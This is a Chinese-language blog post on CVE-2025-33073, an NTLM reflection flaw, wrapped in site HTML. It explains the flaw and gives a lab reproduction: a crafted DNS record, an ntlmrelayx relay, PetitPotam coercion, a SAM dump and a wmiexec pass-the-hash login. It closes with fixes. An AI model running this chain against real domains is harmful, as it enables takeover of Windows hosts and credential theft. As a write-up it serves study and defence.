@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="由Kerberos Reflect来的灵感，通过创建一个指向中继机器的spn，利用特殊的spn格式重新实现NTLM Reflect 感觉文章内说的一句话真的非常好：  some researches demonstrate that bypassing mitigations is just a matter of digging into what the mitigation actually">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2025-33073：NTLM Reflect">
+<meta property="og:url" content="https://cer3s-k.github.io/post/c939f872.html">
+<meta property="og:site_name" content="Cer3sの博客">
+<meta property="og:description" content="由Kerberos Reflect来的灵感，通过创建一个指向中继机器的spn，利用特殊的spn格式重新实现NTLM Reflect 感觉文章内说的一句话真的非常好：  some researches demonstrate that bypassing mitigations is just a matter of digging into what the mitigation actually">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cer3s-k.github.io/post/c939f872/1749894046214-34a280ec-ed86-469b-9a17-82ac0828ddcf.png">
+<meta property="og:image" content="https://cer3s-k.github.io/post/c939f872/1749894073069-7a608955-6ffa-466b-9cbc-2fd7cc5a3825.png">
+<meta property="og:image" content="https://cer3s-k.github.io/post/c939f872/1749893780598-42a160cc-556b-40f8-8f17-8f464f5bceaf.png">
+<meta property="og:image" content="https://cer3s-k.github.io/post/c939f872/1749893863663-6f8de279-659e-46db-b2a4-07ffdd35d421.png">
+<meta property="og:image" content="https://cer3s-k.github.io/post/c939f872/1749891985185-2964b521-5259-4d27-a0a6-cecd25568e58.png">
+<meta property="og:image" content="https://cer3s-k.github.io/post/c939f872/1749892124434-e680c12a-f7d6-4753-ba04-76aaa7de963d.png">
+<meta property="og:image" content="https://cer3s-k.github.io/post/c939f872/1749892240135-6e849328-edef-42ee-893b-4b0af1030176.png">
+<meta property="og:image" content="https://cer3s-k.github.io/post/c939f872/1749892307343-e08e92b5-5410-4e1b-9abc-e08535d146c6.png">
+<meta property="og:image" content="https://cer3s-k.github.io/post/c939f872/1749892718545-403fde38-2bff-4e12-a730-af2f3c9f3945.png">
+<meta property="article:published_time" content="2025-06-14T10:20:06.000Z">
+<meta property="article:modified_time" content="2025-06-14T11:01:01.938Z">
+<meta property="article:author" content="Cer3s">
+<meta property="article:tag" content="AD域">
+<meta property="article:tag" content="CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cer3s-k.github.io/post/c939f872/1749894046214-34a280ec-ed86-469b-9a17-82ac0828ddcf.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CVE-2025-33073：NTLM Reflect</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Cer3s-k">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/post/671766ae.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://cer3s-k.github.io/post/c939f872.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://cer3s-k.github.io/post/c939f872.html&text=CVE-2025-33073：NTLM Reflect"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://cer3s-k.github.io/post/c939f872.html&title=CVE-2025-33073：NTLM Reflect"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://cer3s-k.github.io/post/c939f872.html&is_video=false&description=CVE-2025-33073：NTLM Reflect"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CVE-2025-33073：NTLM Reflect&body=Check out this article: https://cer3s-k.github.io/post/c939f872.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://cer3s-k.github.io/post/c939f872.html&title=CVE-2025-33073：NTLM Reflect"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://cer3s-k.github.io/post/c939f872.html&title=CVE-2025-33073：NTLM Reflect"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://cer3s-k.github.io/post/c939f872.html&title=CVE-2025-33073：NTLM Reflect"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://cer3s-k.github.io/post/c939f872.html&title=CVE-2025-33073：NTLM Reflect"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://cer3s-k.github.io/post/c939f872.html&name=CVE-2025-33073：NTLM Reflect&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://cer3s-k.github.io/post/c939f872.html&t=CVE-2025-33073：NTLM Reflect"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAdns%E8%AE%B0%E5%BD%95"><span class="toc-number">2.1.</span> <span class="toc-text">创建dns记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E4%B8%AD%E7%BB%A7%E8%84%9A%E6%9C%AC"><span class="toc-number">2.2.</span> <span class="toc-text">运行中继脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E5%88%B6%E8%AE%A4%E8%AF%81"><span class="toc-number">2.3.</span> <span class="toc-text">强制认证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">修复方案：</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CVE-2025-33073：NTLM Reflect
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Cer3s</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-14T10:20:06.000Z" class="dt-published" itemprop="datePublished">2025-06-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/AD%E5%9F%9F/">AD域</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/AD%E5%9F%9F/" rel="tag">AD域</a>, <a class="p-category" href="/tags/CVE/" rel="tag">CVE</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>由Kerberos Reflect来的灵感，通过创建一个指向中继机器的spn，利用特殊的spn格式重新实现<font style="color:#DF2A3F;"><strong>NTLM Reflect</strong></font></p>
+<p>感觉文章内说的一句话真的非常好：</p>
+<blockquote>
+<p>some researches demonstrate that bypassing mitigations is just a matter of digging into what the mitigation actually does.<br><strong>一些研究表明，绕过缓解措施其实只是深入研究缓解措施实际作用的问题。</strong></p>
+</blockquote>
+<p><strong><a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html">NTLM本地验证</a> + <a target="_blank" rel="noopener" href="https://x.com/D1iv3/status/1762438159357657404">Kerberos 反射</a> &#x3D;  CVE-2025-33073</strong></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在NTLM认证中存在着一种 <font style="color:#DF2A3F;"><strong>NTLM 本地验证</strong></font> 的特殊情况，服务器在 <font style="color:#DF2A3F;"><strong>NTLM_CHALLENGE</strong></font> 消息中设置<font style="color:#DF2A3F;"><strong>“Negotiate Local Call”</strong></font> 标志后，客户端（与服务器同一机器）会将令牌直接插入服务器上下文，同时在 <font style="color:#DF2A3F;"><strong>Reserved</strong></font> 字段中插入上下文 ID，且整个过程在lsass.exe进程内完成。</p>
+<p>当我们直接用IP进行中继的时候， <font style="color:#DF2A3F;"><strong>Reserved</strong></font> 字段为NULL，本地验证未启用，此时Reflect会失败</p>
+<img src="/post/c939f872/1749894046214-34a280ec-ed86-469b-9a17-82ac0828ddcf.png" class="">
+
+<img src="/post/c939f872/1749894073069-7a608955-6ffa-466b-9cbc-2fd7cc5a3825.png" class="">
+
+<p>当我们添加了dns用域名进行中继的时候</p>
+<img src="/post/c939f872/1749893780598-42a160cc-556b-40f8-8f17-8f464f5bceaf.png" class="">
+
+<p><strong><font style="color:#DF2A3F;">Reserved</font></strong> 字段被设置，认证流程发生改变，服务器将根据 <strong><font style="color:#DF2A3F;">NTLM_NEGOTIATE</font></strong> 消息中的两个字段做出决定 ：工作站名称和域。而特殊DNS记录解析后，目标名称的处理结果与机器名匹配，从而触发本地认证流程，Reflect攻击成功。</p>
+<p>可以看到在我们 <strong><font style="color:#DF2A3F;">NTLM_NEGOTIATE</font></strong> 里面包含了我们正确的工作站名称和域</p>
+<img src="/post/c939f872/1749893863663-6f8de279-659e-46db-b2a4-07ffdd35d421.png" class="">
+
+<p>说明客户端将 DNS 记录 <code>adcs1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA</code>最终等效于 localhost，并提示服务器应考虑 NTLM 本地身份验证</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>注意，一切的前提是，机器<font style="color:#DF2A3F;">不需要SMB签名</font></strong></p>
+<p>我们这里以adcs为例子，如果想以域控为目标需要关闭域控的smb签名</p>
+<p>实验环境</p>
+<blockquote>
+<p>攻击（中继）机器：10.10.0.143</p>
+<p>adcs机器：10.10.0.134</p>
+<p>域控：10.10.0.129</p>
+</blockquote>
+<p>因为涉及到dns和域名，所以需要修改本地hosts文件</p>
+<h3 id="创建dns记录"><a href="#创建dns记录" class="headerlink" title="创建dns记录"></a>创建dns记录</h3><p>我们创建一条指向攻击机器的dns解析记录，创建的值为目标主机名+<code>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 dnstool.py 10.10.0.129 -u &#x27;esg-red.local\jack&#x27; -p ADjk6666 -dc-ip 10.10.0.129 -a add -r adcs1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.0.143 -a modify</span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[-] Modifying record</span><br><span class="line">[+] LDAP operation completed successfully</span><br></pre></td></tr></table></figure>
+
+<img src="/post/c939f872/1749891985185-2964b521-5259-4d27-a0a6-cecd25568e58.png" class="">
+
+<p>等待一段时间等dns解析记录刷新，本地环境可以用下面的命令刷新</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /flushdns</span><br></pre></td></tr></table></figure>
+
+<h3 id="运行中继脚本"><a href="#运行中继脚本" class="headerlink" title="运行中继脚本"></a>运行中继脚本</h3><p>开启ntlmrelayx进行中继</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py -t adcs.esg-red.local -smb2support</span><br></pre></td></tr></table></figure>
+
+<img src="/post/c939f872/1749892124434-e680c12a-f7d6-4753-ba04-76aaa7de963d.png" class="">
+
+<h3 id="强制认证"><a href="#强制认证" class="headerlink" title="强制认证"></a>强制认证</h3><p>我们这里利用PetitPotam.py来进行强制认证</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PetitPotam.py -u jack -p ADjk6666 -d esg-red.local adcs1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA adcs.esg-red.local</span><br></pre></td></tr></table></figure>
+
+<img src="/post/c939f872/1749892240135-6e849328-edef-42ee-893b-4b0af1030176.png" class="">
+
+<p>最终ntlmrelayx成功收到认证并Reflect回adcs获取了sam文件</p>
+<img src="/post/c939f872/1749892307343-e08e92b5-5410-4e1b-9abc-e08535d146c6.png" class="">
+
+<p>使用wmiexec成功连接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py esg-red.local/administrator@10.10.0.134 -hashes :05c8bbcf5529a77e495a98b522f36e91</span><br></pre></td></tr></table></figure>
+
+<img src="/post/c939f872/1749892718545-403fde38-2bff-4e12-a730-af2f3c9f3945.png" class="">
+
+
+
+<h2 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h2><ol>
+<li>打微软补丁</li>
+<li>强制域内机器SMB签名</li>
+</ol>
+<p>参考文档：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025">https://www.synacktiv.com/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/t74_SIMZTiT_ghORC2NmtA">https://mp.weixin.qq.com/s/t74_SIMZTiT_ghORC2NmtA</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Cer3s-k">项目</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAdns%E8%AE%B0%E5%BD%95"><span class="toc-number">2.1.</span> <span class="toc-text">创建dns记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E4%B8%AD%E7%BB%A7%E8%84%9A%E6%9C%AC"><span class="toc-number">2.2.</span> <span class="toc-text">运行中继脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E5%88%B6%E8%AE%A4%E8%AF%81"><span class="toc-number">2.3.</span> <span class="toc-text">强制认证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">修复方案：</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://cer3s-k.github.io/post/c939f872.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://cer3s-k.github.io/post/c939f872.html&text=CVE-2025-33073：NTLM Reflect"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://cer3s-k.github.io/post/c939f872.html&title=CVE-2025-33073：NTLM Reflect"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://cer3s-k.github.io/post/c939f872.html&is_video=false&description=CVE-2025-33073：NTLM Reflect"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CVE-2025-33073：NTLM Reflect&body=Check out this article: https://cer3s-k.github.io/post/c939f872.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://cer3s-k.github.io/post/c939f872.html&title=CVE-2025-33073：NTLM Reflect"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://cer3s-k.github.io/post/c939f872.html&title=CVE-2025-33073：NTLM Reflect"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://cer3s-k.github.io/post/c939f872.html&title=CVE-2025-33073：NTLM Reflect"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://cer3s-k.github.io/post/c939f872.html&title=CVE-2025-33073：NTLM Reflect"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://cer3s-k.github.io/post/c939f872.html&name=CVE-2025-33073：NTLM Reflect&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://cer3s-k.github.io/post/c939f872.html&t=CVE-2025-33073：NTLM Reflect"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Cer3s
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Cer3s-k">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
